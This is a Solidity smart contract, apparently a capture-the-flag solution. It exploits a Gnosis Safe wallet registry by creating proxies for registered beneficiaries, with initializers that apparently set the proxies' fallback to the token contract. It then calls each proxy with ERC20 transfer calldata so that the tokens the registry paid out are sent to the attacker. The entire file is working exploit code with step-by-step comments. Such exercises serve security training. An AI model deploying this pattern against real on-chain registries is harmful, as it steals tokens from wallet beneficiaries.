pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";


contract WalletRegistryExploit {
    GnosisSafeProxyFactory public immutable factory;
    address public immutable registry;
    IERC20 public immutable token;

    constructor(GnosisSafeProxyFactory _factory, address _registry, IERC20 _token) {
        factory = _factory;
        registry = _registry;
        token = _token;
    }

    function exploit(address masterCopy, bytes[] calldata initializers) external {
        for(uint i = 0; i < initializers.length; i++) {
            // Create proxy for each beneficiary of the Wallet Registry
            // Set the fallback function of the proxy to call the token contract
            address proxy = createProxy(masterCopy, initializers[i]);

            // Call proxy contract with ERC20.transfer() call data
            // Since proxy contract does not have 'transfer()', the fallback function is called
            // Proxy fallback function calls the token contract with same call data
            // Tokens are sent from the proxy to the attacker
            bytes memory transferData = abi.encodeWithSelector(IERC20.transfer.selector, msg.sender, 10 ether);
            (bool success, ) = proxy.call(transferData);
            require(success, "Proxy called failed");
        }
    }

    function createProxy(
        address masterCopy, 
        bytes calldata initializer
    ) public returns (address) {
        // Create a proxy contract using the proxy factory
        // After proxy is created, proxy factory will call wallet registry contract
        // Wallet registry will transfer tokens to new proxy contract for each registered beneficiary
        return address(
            factory.createProxyWithCallback(
                masterCopy, 
                initializer, 
                0, 
                IProxyCreationCallback(registry)
            )
        );
    }
}